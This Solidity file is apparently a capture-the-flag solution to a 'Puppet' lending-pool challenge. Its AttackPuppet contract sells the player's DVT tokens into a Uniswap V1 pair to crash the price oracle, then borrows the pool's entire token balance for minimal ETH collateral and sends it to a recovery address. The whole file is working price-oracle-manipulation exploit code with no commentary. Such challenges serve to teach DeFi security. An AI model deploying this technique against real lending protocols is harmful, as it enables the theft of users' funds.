// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV1Exchange} from "../../src/puppet/IUniswapV1Exchange.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";

interface IPuppetPool {
    function borrow(uint256 amount, address recipient) external payable;
    function calculateDepositRequired(uint256 amount) external view returns (uint256);
}

contract AttackPuppet {
    IPuppetPool private pool;
    IUniswapV1Exchange private uniswapPair;
    IERC20 private token;
    address private recovery;
    uint256 private playerTokenBalance;
    uint256 private poolTokenBalance;

    constructor(
        address _pool,
        address _uniswapPair,
        address _token,
        address _recovery,
        uint256 _playerTokenBalance,
        uint256 _poolTokenBalance
    ) payable {
        pool = IPuppetPool(_pool);
        uniswapPair = IUniswapV1Exchange(_uniswapPair);
        token = IERC20(_token);
        recovery = _recovery;
        playerTokenBalance = _playerTokenBalance;
        poolTokenBalance = _poolTokenBalance;
    }

    function attack() external {
        // Swap DVT-ETH
        token.approve(address(uniswapPair), playerTokenBalance);
        uniswapPair.tokenToEthSwapInput(playerTokenBalance, 9 ether, block.timestamp * 2);

        // Borrow DVT
        uint256 ethInput = pool.calculateDepositRequired(poolTokenBalance);
        pool.borrow{value: ethInput}(poolTokenBalance, recovery);
    }

    receive() external payable {}
}
